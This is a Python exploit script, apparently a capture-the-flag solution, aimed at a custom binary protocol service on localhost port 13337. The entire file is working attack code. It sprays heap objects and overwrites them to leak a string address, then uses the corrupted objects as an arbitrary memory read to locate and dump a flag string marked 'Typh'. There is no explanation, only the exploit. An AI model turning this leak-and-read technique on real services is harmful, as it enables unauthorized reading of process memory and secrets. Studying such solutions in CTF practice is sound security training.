import socket
import struct

def create_buf(command, data):
    code = struct.pack("<L", 0xDEADBEEF) # signature
    code += struct.pack("B", len(data)) # len
    code += struct.pack("B", command) # command
    for command in data:
        code += command
    return code

def lead_string_addr():
    # opening connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 13337))

    print("Spraying objects")
    data = []
    for i in range(1):
        data.append(b"\x04\x00\x00\x00\x04\x00\x00\x00")
    buf = create_buf(4, data) 
    s.send(buf)
    data = s.recv(0x10000)

    print("Overriding stuff")
    data = []
    for i in range(253):
        data.append(b"\x04ABCD")
    buf = create_buf(3, data)
    s.send(buf)
    data = s.recv(0x10000)

    print("Reading using overwritten stuff")
    data = []
    for i in range(128):
        data.append(b"\x04\x00\x00\x00\x04\x00\x00\x00")
    buf = create_buf(4, data)
    s.send(buf)
    data = s.recv(0x10000)

    # closing connection
    s.close()

    # unpacking data
    return struct.unpack("<I", data[2034:2034+4])[0]

def read_addrs(addrs):
    # opening connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 13337))

    print("Spraying objects")
    data = []
    for i in range(128):
        data.append(b"\x04ABCD")
    buf = create_buf(3, data) 
    s.send(buf)
    data = s.recv(0x10000)

    print("Overriding stuff")
    data = []
    for addr in addrs:
        data.append(b"\x04\x00\x00\x00" + struct.pack("<I", int(addr / 4)))
    buf = create_buf(4, data)
    s.send(buf)
    data = s.recv(0x10000)
    print(data)

    print("Reading using overwritten stuff")
    data = []
    for i in range(128):
        data.append(b"\x04ABCD")
    buf = create_buf(3, data) 
    s.send(buf)
    data = s.recv(0x10000)

    s.close()
    ret = []
    for i in range(len(addrs)):
        ret.append(struct.unpack("<I", data[647 + 5 * i:647 +  + 5 * i + 4])[0])
    return ret

if __name__ == "__main__":
    string_addr = lead_string_addr()
    print("Leaked string address: " + hex(string_addr))

    addrs = []
    for i in range(31):
        addrs.append(string_addr - 0x108 * i)
    for i in range(31):
        addrs.append(string_addr + 0x108 * i)
    
    values = read_addrs(addrs)
    addr = 0
    for i in range(len(values)):
        if values[i] == 1752201556: # 1752201556 = 0x70547968 = "Typh"
            addr = addrs[i]
            print("Found flag address: " + hex(addr))
    if addr == 0:
        print("Address not found")
        exit(0)
            
    addrs = []
    for i in range(10):
        addrs.append(addr + i * 4)
    values = read_addrs(addrs)
    full = b""
    for value in values:
        full += struct.pack("<I", value)
    print(full)